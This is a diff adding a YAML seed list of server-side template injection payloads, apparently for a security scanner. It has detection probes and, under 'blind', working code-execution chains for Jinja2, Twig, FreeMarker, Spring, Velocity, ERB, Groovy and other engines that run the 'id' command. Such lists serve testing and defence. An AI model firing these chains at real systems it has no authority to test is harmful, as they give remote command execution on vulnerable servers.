@@ -1,0 +1,68 @@
+# SSTI payload expansion: more engines (detect + RCE chains)
+seeds:
+  ssti:
+    detect:
+      - raw: "{{7*'7'}}"
+        indicator: "7777777"
+        ctx: ["all"]
+      - raw: "{{7*7}}"
+        indicator: "49"
+        ctx: ["all"]
+      - raw: "${7*7}"
+        indicator: "49"
+        ctx: ["all"]
+      - raw: "#{7*7}"
+        indicator: "49"
+        ctx: ["all"]
+      - raw: "<%= 7*7 %>"
+        indicator: "49"
+        ctx: ["all"]
+      - raw: "{{[0,1,2].length}}"
+        indicator: "3"
+        ctx: ["all"]
+      - raw: "{{'a'.upper()}}"
+        indicator: "A"
+        ctx: ["all"]
+      - raw: "{{7**7}}"
+        indicator: "823543"
+        ctx: ["all"]
+      - raw: "${T(java.lang.Math).random()}"
+        indicator: "0."
+        ctx: ["all"]
+    blind:
+      - raw: "{{ cycler.__init__.__globals__.os.popen('id').read() }}"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "{{ lipsum.__globals__.os.popen('id').read() }}"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "{{ config.__class__.__init__.__globals__.os.popen('id').read() }}"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "{{['id']|filter('system')|join(',')}}"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "{{['id']|map('system')|join}}"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "${'freemarker.template.utility.Execute'?new()('id')}"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "${T(java.lang.Runtime).getRuntime().exec('id')}"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "#set($x=$rt.getClass().forName('java.lang.Runtime').getRuntime().exec('id'))"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "{system('id')}"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "${__import__('os').popen('id').read()}"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "<%= system(\\\"id\\\") %>"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "${groovy:Runtime.getRuntime().exec('id')}"
+        indicator: "uid="
+        ctx: ["all"]
